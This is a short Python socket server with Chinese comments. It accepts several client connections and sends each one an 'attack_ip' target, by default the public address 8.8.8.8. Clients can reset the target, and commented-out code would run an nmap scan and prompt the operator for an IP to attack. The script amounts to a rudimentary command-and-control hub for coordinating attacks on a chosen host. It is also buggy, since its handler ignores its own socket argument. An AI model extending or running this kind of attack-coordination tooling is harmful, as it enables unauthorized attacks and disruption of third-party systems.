#!/usr/bin/python
#coding=UTF-8

"""
TCP/IP Server sample
"""

import socket
import threading
import sys
import nmap_test
bind_ip = "127.0.0.1"
bind_port = 8787

s = ""

global attack_ip
attack_ip = '8.8.8.8'  #目標IP

#print('尋找ip port..')
#nmap_test.nmap_scan(attack_ip)
#all_port = nmap_test.port_analize
#if (attack_ip==""):
#    attack_ip = input("input ip you want attack:")


global my_client
my_client = []

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((bind_ip, bind_port))

server.listen(5)

print ("[*] 在 %s:%d 進行監聽" % (bind_ip, bind_port))

def handle_client(client_socket,address,attack_ip):
    while True:
        #message = attack_ip+':'+all_port
        conn.send(attack_ip.encode('utf-8'))
        try:
            indata = conn.recv(1024) #接收來自client的資料
            print('來自',str(address[0]),':',str(address[1]),'receive: ' + indata.decode())
        except :

            print(str(address[0]),':',str(address[1]),'結束通訊')
            conn.close()
            sys.exit(0)

        if ('ip' in str(indata)):
            attack_ip = indata[2:]
            print('attack_ip set to: ' + attack_ip.decode())
            outdata = 'attack_ip set to:' + attack_ip.decode()
            conn.send(outdata.encode())

        if len(indata) == 0: # connection closed
            try:
                conn.close()
                print('client closed connection.')
            except:
                print('client closed connection.')


        outdata = 'echo ' + indata.decode() #回傳資料
        conn.send(outdata.encode())

def sendallclients(message):
    for client in my_client :
        client.send(message.encode())

def input_chlid_thread(attack_ip):
    while True:
        attack_ip = input("input ip you want attack:")

while True:


    conn, addr = server.accept()
    print('connected by ' + str(addr))
    my_client.append(conn)


    try:
        client_handler = threading.Thread(target=handle_client, args=(conn,addr,attack_ip,))
        client_handler.start()
        #input_chlid_thread = threading.Thread(target = input_chlid_thread,args=(attack_ip,))
        #input_chlid_thread.start()

    except:
        print('連接失敗')
